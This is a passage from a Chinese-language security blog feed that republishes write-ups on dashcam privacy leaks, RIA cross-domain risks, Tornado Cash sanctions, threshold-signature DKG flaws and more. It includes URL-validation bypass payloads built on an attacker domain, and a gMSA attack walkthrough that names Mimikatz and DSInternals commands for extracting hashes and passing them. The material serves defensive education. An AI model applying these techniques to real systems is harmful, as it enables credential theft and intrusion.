&lt;li&gt;Safari特有的域名分割攻击技术（由@t0xodile提交）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些更新解决了攻击者使用特殊字符操纵域名绕过验证的场景，例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://example.com.{.web-attacker.com/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://example.com.}.web-attacker.com/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://example.com.`.web-attacker.com/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>BlackVue行车记录仪云功能漏洞：你的位置和实时画面可能正被陌生人窥视</title>
        <link>http://localhost:1313/p/blackvue%E8%A1%8C%E8%BD%A6%E8%AE%B0%E5%BD%95%E4%BB%AA%E4%BA%91%E5%8A%9F%E8%83%BD%E6%BC%8F%E6%B4%9E%E4%BD%A0%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E5%AE%9E%E6%97%B6%E7%94%BB%E9%9D%A2%E5%8F%AF%E8%83%BD%E6%AD%A3%E8%A2%AB%E9%99%8C%E7%94%9F%E4%BA%BA%E7%AA%A5%E8%A7%86/</link>
        <pubDate>Mon, 04 Aug 2025 13:22:45 +0800</pubDate>
        
        <guid>http://localhost:1313/p/blackvue%E8%A1%8C%E8%BD%A6%E8%AE%B0%E5%BD%95%E4%BB%AA%E4%BA%91%E5%8A%9F%E8%83%BD%E6%BC%8F%E6%B4%9E%E4%BD%A0%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E5%AE%9E%E6%97%B6%E7%94%BB%E9%9D%A2%E5%8F%AF%E8%83%BD%E6%AD%A3%E8%A2%AB%E9%99%8C%E7%94%9F%E4%BA%BA%E7%AA%A5%E8%A7%86/</guid>
        <description>&lt;h1 id=&#34;blackvue行车记录仪---这不是漏洞而是功能&#34;&gt;BlackVue行车记录仪 - 这不是漏洞，而是&amp;quot;功能&amp;quot;
&lt;/h1&gt;&lt;p&gt;BlackVue云联网行车记录仪会泄露你的位置信息，并允许任何注册免费账户的人查看你的实时画面。厂商该重视这个问题了！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更新&lt;/strong&gt;：经过两年与BlackVue沟通无果后，我认为公开此事符合公共利益。特别是在汽车犯罪率上升的背景下，尽管与BlackVue没有直接关联，但仍需引起人们警惕。&lt;/p&gt;
&lt;h2 id=&#34;问题发现过程&#34;&gt;问题发现过程
&lt;/h2&gt;&lt;p&gt;2022年某个周末，我在研究新购买的行车记录仪时，发现了移动应用中的&amp;quot;连接云端&amp;quot;选项。我的设备配有LTE模块以实现&amp;quot;云连接&amp;quot;功能，原本以为这只是用于向手机推送碰撞或移动检测通知的合理功能。&lt;/p&gt;
&lt;p&gt;但事实令人震惊：任何拥有移动设备的人（浏览器也可实现）只需下载BlackVue应用，选择&amp;quot;连接云端&amp;quot;（无需事先拥有设备），就能看到地图上所有联网行车记录仪的地理位置标识。更糟糕的是，注册账户后（仅需提供邮箱，支持Gmail/Apple Private Relay自动登录），不仅能查看设备位置，还能观看实时画面。&lt;/p&gt;
&lt;h2 id=&#34;历史投诉记录&#34;&gt;历史投诉记录
&lt;/h2&gt;&lt;h3 id=&#34;2021年11月&#34;&gt;2021年11月
&lt;/h3&gt;&lt;p&gt;Antisocial Engineer团队早在2020年11月就向BlackVue报告此问题，但厂商将其辩称为&amp;quot;功能&amp;quot;不予修复。&lt;/p&gt;
&lt;h3 id=&#34;2021年10月&#34;&gt;2021年10月
&lt;/h3&gt;&lt;p&gt;安全研究员Colin向BlackVue英国分部提交的投诉邮件显示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;通过APP&amp;gt;连接云端&amp;gt;选择摄像头，我可以监听车内对话，观察可疑驾驶行为，并通过跟踪车辆获取住址和安全信息。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;厂商回复称：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;这是BlackVue云功能的特性，只有用户在隐私设置中主动选择&amp;rsquo;分享位置&amp;rsquo;才会出现在地图上。默认设置是关闭的。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;当Colin追问为何能监听对话和跟踪回家路线时，BlackVue最终回应：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;这是个人选择问题&amp;hellip;该&amp;rsquo;功能&amp;rsquo;已存在近五年。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;2020年1月&#34;&gt;2020年1月
&lt;/h3&gt;&lt;p&gt;Vice媒体曾报道过相同问题，当时BlackVue仅调整了部分设置，仍拒绝承认其应用的隐私风险。&lt;/p&gt;
&lt;h2 id=&#34;防护建议&#34;&gt;防护建议
&lt;/h2&gt;&lt;p&gt;最彻底的解决方案是完全不使用BlackVue的云连接功能。如果已在使用，务必在设置中关闭GPS选项以阻止位置访问。这个问题被曝光两年后，BlackVue仍拒绝修复，故撰写本文警示公众。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软紧急发布安全公告MS15-078补丁更新</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E5%8F%91%E5%B8%83%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8Ams15-078%E8%A1%A5%E4%B8%81%E6%9B%B4%E6%96%B0/</link>
        <pubDate>Mon, 04 Aug 2025 13:06:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E5%8F%91%E5%B8%83%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8Ams15-078%E8%A1%A5%E4%B8%81%E6%9B%B4%E6%96%B0/</guid>
        <description>&lt;p&gt;今天，我们发布了安全公告MS15-078，为Microsoft Windows提供紧急更新。启用自动更新的用户或手动安装该补丁的客户将获得安全防护。&lt;/p&gt;
&lt;p&gt;我们建议客户按照安全公告中的指引尽快应用此更新。更多技术细节可查阅微软&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;公告摘要页面&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;MSRC团队&lt;/p&gt;
</description>
        </item>
        <item>
        <title>RIA安全协作：微软与Adobe的跨域防御实践</title>
        <link>http://localhost:1313/p/ria%E5%AE%89%E5%85%A8%E5%8D%8F%E4%BD%9C%E5%BE%AE%E8%BD%AF%E4%B8%8Eadobe%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Mon, 04 Aug 2025 12:50:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ria%E5%AE%89%E5%85%A8%E5%8D%8F%E4%BD%9C%E5%BE%AE%E8%BD%AF%E4%B8%8Eadobe%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h3 id=&#34;协作保障ria安全&#34;&gt;协作保障RIA安全
&lt;/h3&gt;&lt;p&gt;微软与Adobe长期保持安全合作。在本次BlueHat会议上，我们将共同分享富互联网应用(RIA)安全领域的研究成果。尽管双方各自拥有完善的安全模型，但攻击者常通过技术组合寻找突破口。开发者也可能在不知风险的情况下混合使用不同技术。通过研究共享与信息整合，我们可确保开发者掌握核心技术知识，无论采用何种技术组合都能为用户提供安全体验。&lt;/p&gt;
&lt;h3 id=&#34;复合页面的安全挑战&#34;&gt;复合页面的安全挑战
&lt;/h3&gt;&lt;p&gt;单个网页可能由多个开发团队采用不同技术构建。作为站点安全负责人，必须清晰理解内容交互方式才能评估风险。若缺乏对各内容模块权限的明确映射，攻击者可能找到防御体系的隐蔽突破路径。&lt;/p&gt;
&lt;h4 id=&#34;典型案例分析&#34;&gt;典型案例分析
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;跨域权限假设错误&lt;/strong&gt;&lt;br&gt;
研究者发现：当woodgrovebank.com向adatum.com授予XHR2跨域权限时，若adatum.com的SWF广告通过allowScriptAccess参数获得JavaScript访问权，则第三方广告可间接访问银行域名——这可能违背银行的原始授权意图。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;真实世界攻击复现&lt;/strong&gt;&lt;br&gt;
renren.com蠕虫事件中，恶意SWF利用&amp;quot;always&amp;quot;脚本权限注入SCRIPT标签，再借助站点现有的跨域AJAX架构收集用户社交关系。该攻击模式同样适用于具有EnableHTMLAccess权限的Silverlight内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;安全架构建议&#34;&gt;安全架构建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;统一权限视图&lt;/strong&gt;：混合内容架构需建立全局权限视图，通过数据流图标注跨域通信节点&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;通用防御策略&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;审核所有RIA内容对HTML DOM的访问权限&lt;/li&gt;
&lt;li&gt;制定兼容多种RIA技术的安全规范&lt;/li&gt;
&lt;li&gt;限制第三方内容的脚本执行权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术协同价值&#34;&gt;技术协同价值
&lt;/h3&gt;&lt;p&gt;理解RIA平台的共性与差异，能使开发者：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准确评估混合技术架构风险&lt;/li&gt;
&lt;li&gt;设计弹性安全边界&lt;/li&gt;
&lt;li&gt;在丰富用户体验与安全防护间取得平衡&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>区块链制裁下的规避策略与技术对抗</title>
        <link>http://localhost:1313/p/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%88%B6%E8%A3%81%E4%B8%8B%E7%9A%84%E8%A7%84%E9%81%BF%E7%AD%96%E7%95%A5%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%8A%97/</link>
        <pubDate>Mon, 04 Aug 2025 12:28:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%88%B6%E8%A3%81%E4%B8%8B%E7%9A%84%E8%A7%84%E9%81%BF%E7%AD%96%E7%95%A5%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%8A%97/</guid>
        <description>&lt;h1 id=&#34;区块链制裁下的规避研究&#34;&gt;区块链制裁下的规避研究
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;区块链地址制裁已成为应对恶意活动的常见监管手段。但由于复杂的交易流和资金混淆技术，无许可链上的执法仍面临挑战。本文以加密货币混币工具Tornado Cash为案例，定量评估了美国外国资产控制办公室（OFAC）在957天内对6.79百万个以太坊区块（涉及10.7亿笔交易）的制裁效果。研究发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OFAC制裁使Tornado Cash总存款量下降71.03%（约20亿美元）&lt;/li&gt;
&lt;li&gt;但78.33%的以太坊安全事件仍在使用该工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术限制分析&#34;&gt;技术限制分析
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;二元制裁分类易受粉尘攻击&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;区块链生产者的碎片化审查&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户对混淆服务的复杂利用&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;解决方案
&lt;/h2&gt;&lt;p&gt;提出基于&lt;strong&gt;量化不纯度&lt;/strong&gt;的实用算法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;平均处理时间：0.07±0.03秒/区块&lt;/li&gt;
&lt;li&gt;在Bybit漏洞测试中达到：
&lt;ul&gt;
&lt;li&gt;97.61%精确率&lt;/li&gt;
&lt;li&gt;74.08%召回率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术贡献&#34;&gt;技术贡献
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;为DeFi监管讨论提供实证数据&lt;/li&gt;
&lt;li&gt;阐明执法挑战的技术根源&lt;/li&gt;
&lt;li&gt;提出应对制裁与安全风险的合规策略框架&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>攻击Active Directory组托管服务账户(GMSA)的技术解析</title>
        <link>http://localhost:1313/p/%E6%94%BB%E5%87%BBactive-directory%E7%BB%84%E6%89%98%E7%AE%A1%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7gmsa%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 12:12:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%94%BB%E5%87%BBactive-directory%E7%BB%84%E6%89%98%E7%AE%A1%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7gmsa%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;攻击active-directory组托管服务账户gmsa&#34;&gt;攻击Active Directory组托管服务账户(GMSA)
&lt;/h1&gt;&lt;p&gt;2020年5月，我在Trimarc网络研讨会&amp;quot;保护Active Directory：解决常见问题&amp;quot;中介绍了AD组托管服务账户(GMSA)的安全问题。本文是研讨会内容的扩展版本。&lt;/p&gt;
&lt;h2 id=&#34;组托管服务账户gmsa概述&#34;&gt;组托管服务账户(GMSA)概述
&lt;/h2&gt;&lt;p&gt;传统用作服务账户的用户账户很少更改密码。GMSA(自Windows 2012引入)由AD自动管理密码变更。但关键点在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AD管理GMSA密码&lt;/li&gt;
&lt;li&gt;托管计算机从AD请求当前密码启动服务&lt;/li&gt;
&lt;li&gt;需明确配置允许访问密码的计算机账户&lt;/li&gt;
&lt;li&gt;若攻击者控制托管计算机或有权账户，GMSA即告失陷&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;gmsa关键属性&#34;&gt;GMSA关键属性
&lt;/h2&gt;&lt;p&gt;GMSA具有特定对象类和属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;msDS-GroupMSAMembership&lt;/code&gt;：存储可访问密码的安全主体&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msds-ManagedPassword&lt;/code&gt;：包含密码信息的BLOB&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msDS-ManagedPasswordId&lt;/code&gt;：当前密码数据的密钥标识符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msDS-ManagedPasswordInterval&lt;/code&gt;：密码自动变更间隔天数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击技术详解&#34;&gt;攻击技术详解
&lt;/h2&gt;&lt;h3 id=&#34;方法一入侵托管服务器&#34;&gt;方法一：入侵托管服务器
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;通过SPN定位托管服务器(如LCNSQL01)&lt;/li&gt;
&lt;li&gt;获取服务器管理员权限后：
&lt;ul&gt;
&lt;li&gt;使用Mimikatz执行&lt;code&gt;sekurlsa::logonpasswords&lt;/code&gt;获取服务账户凭证&lt;/li&gt;
&lt;li&gt;发现GMSA密码显示异常(如&amp;quot;&lt;em&gt;SA&lt;/em&gt;{GUID}&amp;ldquo;格式)&lt;/li&gt;
&lt;li&gt;改用&lt;code&gt;sekurlsa::ekeys&lt;/code&gt;获取正确的Kerberos票据和NT哈希&lt;/li&gt;
&lt;li&gt;实施哈希传递(PTH)攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法二入侵有权账户&#34;&gt;方法二：入侵有权账户
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;枚举&lt;code&gt;msDS-GroupMSAMembership&lt;/code&gt;属性中的授权组(如&amp;quot;SVC-LAB-GMSA1 Group&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;通过组成员关系分析发现：
&lt;ul&gt;
&lt;li&gt;11个用户账户(其中9个为普通用户)具有密码访问权&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;入侵任一授权账户后：
&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;Get-ADServiceAccount&lt;/code&gt;获取明文密码BLOB&lt;/li&gt;
&lt;li&gt;通过DSInternals的&lt;code&gt;ConvertTo-NTHash&lt;/code&gt;转换为NT哈希&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;若入侵计算机账户：
&lt;ul&gt;
&lt;li&gt;需以SYSTEM权限执行上述操作&lt;/li&gt;
&lt;li&gt;使用PSEXEC获取SYSTEM上下文&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;验证与防御&#34;&gt;验证与防御
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;验证技术&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用DSInternals的&lt;code&gt;Get-ADReplAccount&lt;/code&gt;确认AD中的密码哈希与获取值一致&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;防御措施&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实施最小权限原则&lt;/li&gt;
&lt;li&gt;避免将GMSA加入AD特权组(除非用于域控制器)&lt;/li&gt;
&lt;li&gt;严格限制GMSA访问权限和使用范围&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;特别感谢DSInternals的Michael Grafnetter和Mimikatz开发者Benjamin Delpy的技术支持。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用符号执行与区块链尸检——Trail of Bits在Devcon IV的技术实践</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B0%B8%E6%A3%80trail-of-bits%E5%9C%A8devcon-iv%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Mon, 04 Aug 2025 11:55:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B0%B8%E6%A3%80trail-of-bits%E5%9C%A8devcon-iv%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h3 id=&#34;使用manticore和符号执行发现智能合约漏洞&#34;&gt;使用Manticore和符号执行发现智能合约漏洞
&lt;/h3&gt;&lt;p&gt;在该工作坊中，Josselin Feist演示了如何运用开源符号执行引擎Manticore。该工具不仅能即时发现代码缺陷，还可验证代码正确性。120名参与者通过实践掌握了形式化验证方法，这些技术能确保智能合约严格遵循设计规范。&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;获取工作坊幻灯片与练习材料&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;区块链尸检&#34;&gt;区块链尸检
&lt;/h3&gt;&lt;p&gt;Jay Little通过闪电演讲展示了其团队对3万份自毁合约的复原与分析技术。针对以太坊主网200万合约中极少有价值合约被销毁的现象，Jay开发了新型工具链：重新处理区块链账本数据、重建带状态的合约，并利用调用轨迹和启发式方法分析可疑交易。&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;查看可疑自毁交易的筛选技术&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;安全现状专家讨论&#34;&gt;安全现状专家讨论
&lt;/h3&gt;&lt;p&gt;Kevin Seagraves主持的专题讨论聚焦以太坊安全态势：过去一年的重大安全变化、智能合约与传统系统安全差异、漏洞赏金机制效用评估等核心议题。&lt;/p&gt;
&lt;h3 id=&#34;安全审计深度培训&#34;&gt;安全审计深度培训
&lt;/h3&gt;&lt;p&gt;JP在为期全天的培训中分享了Trail of Bits的安全评审方法论，强调审计不仅应输出漏洞列表，更需提供项目整体风险评估、架构与开发生命周期指导等完整解决方案。该培训将于12月11日在纽约再次举办。&lt;/p&gt;
&lt;h3 id=&#34;devcon特别彩蛋&#34;&gt;Devcon特别彩蛋
&lt;/h3&gt;&lt;p&gt;Evan Sultanik未参会期间开发了以太坊客户端模糊测试工具Etheno。该工具可自动检测各以太坊客户端间的行为差异，仅用2分钟便复现了10月Ropsten测试网出现的共识漏洞。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;© 2025 Trail of Bits&lt;br&gt;
采用Hugo与Mainroad主题生成&lt;/p&gt;
</description>
        </item>
        <item>
        <title>每位聊天机器人开发者必备的核心技能</title>
        <link>http://localhost:1313/p/%E6%AF%8F%E4%BD%8D%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%BC%80%E5%8F%91%E8%80%85%E5%BF%85%E5%A4%87%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E8%83%BD/</link>
        <pubDate>Mon, 04 Aug 2025 11:39:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%AF%8F%E4%BD%8D%E8%81%8A%E5%A4%A9%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%BC%80%E5%8F%91%E8%80%85%E5%BF%85%E5%A4%87%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E8%83%BD/</guid>
        <description>&lt;h1 id=&#34;每位聊天机器人开发者必备的核心技能&#34;&gt;每位聊天机器人开发者必备的核心技能
&lt;/h1&gt;&lt;p&gt;聊天机器人的角色已从简单的客户沟通工具演变为能解决查询、分析情感并提供行为洞察的智能服务接口。这意味着聊天机器人开发者需要掌握更复杂的技术栈。&lt;/p&gt;
&lt;h2 id=&#34;构建聊天机器人的核心要素&#34;&gt;构建聊天机器人的核心要素
&lt;/h2&gt;&lt;p&gt;开发有效的聊天机器人需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对人类对话逻辑的深刻理解&lt;/li&gt;
&lt;li&gt;扎实的编程能力&lt;/li&gt;
&lt;li&gt;数周甚至更长的开发周期&lt;/li&gt;
&lt;li&gt;严格的预算和时间控制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;顶级聊天机器人开发技能&#34;&gt;顶级聊天机器人开发技能
&lt;/h2&gt;&lt;h3 id=&#34;1-框架专业能力&#34;&gt;1. 框架专业能力
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;必须掌握IBM Watson、Api.ai、Microsoft Azure Bot Service等主流框架&lt;/li&gt;
&lt;li&gt;需熟练使用Wit.ai、Rasa等开源框架进行实践&lt;/li&gt;
&lt;li&gt;能根据项目需求选择合适框架&lt;/li&gt;
&lt;li&gt;小公司项目需掌握付费框架的NLP集成能力&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-编程语言精通&#34;&gt;2. 编程语言精通
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;核心语言：Java、Python、PHP、Ruby&lt;/li&gt;
&lt;li&gt;语言能力决定定制化开发深度&lt;/li&gt;
&lt;li&gt;建议通过在线课程持续提升&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-新兴技术掌握&#34;&gt;3. 新兴技术掌握
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;人工智能(AI)和自然语言处理(NLP)是基础&lt;/li&gt;
&lt;li&gt;机器学习(ML)决定对话流程设计&lt;/li&gt;
&lt;li&gt;需持续跟踪技术演进（如对比10年前的技术差异）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-跨平台集成经验&#34;&gt;4. 跨平台集成经验
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;需支持WhatsApp/Facebook/Skype等多渠道部署&lt;/li&gt;
&lt;li&gt;55%消费者倾向通过即时通讯工具联系企业&lt;/li&gt;
&lt;li&gt;要确保跨平台服务一致性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-多团队协作能力&#34;&gt;5. 多团队协作能力
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;需与对话设计师合作开发响应逻辑&lt;/li&gt;
&lt;li&gt;配合分析团队优化部署效果&lt;/li&gt;
&lt;li&gt;保持各环节的高效沟通&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;成为专业开发者的路径&#34;&gt;成为专业开发者的路径
&lt;/h2&gt;&lt;p&gt;建议通过以下方式提升竞争力：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统学习推荐框架&lt;/li&gt;
&lt;li&gt;巩固编程基础&lt;/li&gt;
&lt;li&gt;参加AI/NLP专项课程&lt;/li&gt;
&lt;li&gt;积累跨平台项目经验&lt;/li&gt;
&lt;li&gt;培养团队协作意识&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;随着行业65%的企业面临人才短缺，掌握这些技能的开发者将获得显著职业优势。即使当前存在技能缺口，通过针对性学习仍可快速提升竞争力。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>阈值签名方案中的共享密钥破解漏洞分析</title>
        <link>http://localhost:1313/p/%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E6%96%B9%E6%A1%88%E4%B8%AD%E7%9A%84%E5%85%B1%E4%BA%AB%E5%AF%86%E9%92%A5%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 11:34:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E6%96%B9%E6%A1%88%E4%B8%AD%E7%9A%84%E5%85%B1%E4%BA%AB%E5%AF%86%E9%92%A5%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;打破阈值签名方案中的共享密钥---trail-of-bits博客&#34;&gt;打破阈值签名方案中的共享密钥 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;今天我们将披露一个拒绝服务漏洞，该漏洞影响基于Frost、DMZ21、GG20和GG18协议的多个阈值签名方案实现中的Pedersen分布式密钥生成(DKG)阶段。该漏洞允许单个恶意参与者秘密提高重构共享密钥所需的阈值，可能导致使用共享密钥生成的签名无效。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;我们去年在与Chainflip的合作中首次注意到这个漏洞。在审查Chainflip的Frost阈值签名方案实现时，我们发现其采用了不寻常的做法——这是我们从未见过的。通常这类异常现象表明代码库存在弱点或漏洞，但这次Chainflip的防御性编码实践反而保护了其实现免遭漏洞影响。通过格外谨慎，Chainflip还避免了在代码库中引入可能被单方利用来破坏协议密钥生成阶段创建的共享密钥的漏洞。&lt;/p&gt;
&lt;h2 id=&#34;pedersen-dkg协议解析&#34;&gt;Pedersen DKG协议解析
&lt;/h2&gt;&lt;p&gt;该漏洞实际上很容易理解，但需要先了解Pedersen DKG协议背后的数学细节。Pedersen DKG协议基于Feldman的可验证秘密共享(VSS)方案，这是Shamir秘密共享方案的扩展。&lt;/p&gt;
&lt;p&gt;设G是一个离散对数问题困难的交换群，g是G的生成元。在(t,n)-Feldman VSS方案中：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;经销商生成随机t次多项式p(x) = a0 + a1x + &amp;hellip; + atx^t&lt;/li&gt;
&lt;li&gt;计算秘密份额si = p(i)&lt;/li&gt;
&lt;li&gt;发布系数承诺Ai = g^ai&lt;/li&gt;
&lt;li&gt;参与者可通过指数运算验证其份额&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Pedersen DKG协议本质上是并行运行n个Feldman VSS方案实例，最终生成一个所有参与者都不知道的(t,n)-Shamir秘密共享值。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理分析&#34;&gt;漏洞原理分析
